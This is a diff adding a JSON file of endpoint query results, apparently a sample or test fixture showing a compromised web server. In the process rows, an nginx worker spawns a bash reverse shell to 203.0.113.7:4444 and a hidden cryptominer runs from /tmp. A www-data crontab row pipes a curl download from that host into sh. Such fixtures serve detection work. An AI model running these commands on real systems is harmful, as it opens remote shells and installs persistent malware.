@@ -1,0 +1,58 @@
+{
+  "results": [
+    {
+      "name": "processes",
+      "rows": [
+        {
+          "pid": "1",
+          "parent": "0",
+          "name": "systemd",
+          "path": "/usr/lib/systemd/systemd",
+          "cmdline": "/sbin/init",
+          "uid": "0",
+          "on_disk": "1"
+        },
+        {
+          "pid": "1020",
+          "parent": "1",
+          "name": "nginx",
+          "path": "/usr/sbin/nginx",
+          "cmdline": "nginx: worker process",
+          "uid": "33",
+          "on_disk": "1"
+        },
+        {
+          "pid": "4242",
+          "parent": "1020",
+          "name": "bash",
+          "path": "/usr/bin/bash",
+          "cmdline": "bash -c bash -i >& /dev/tcp/203.0.113.7/4444 0>&1",
+          "uid": "33",
+          "on_disk": "1"
+        },
+        {
+          "pid": "4300",
+          "parent": "4242",
+          "name": "kworkerd",
+          "path": "/tmp/.x/kworkerd",
+          "cmdline": "/tmp/.x/kworkerd -o stratum+tcp://pool.example.net:3333",
+          "uid": "33",
+          "on_disk": "0"
+        }
+      ]
+    },
+    {
+      "name": "cron_jobs",
+      "rows": [
+        {
+          "command": "curl -fsSL http://203.0.113.7/k.sh | sh",
+          "path": "/var/spool/cron/crontabs/www-data"
+        }
+      ]
+    },
+    {
+      "name": "admin_users",
+      "error": "example of a query that failed on the client"
+    }
+  ]
+}
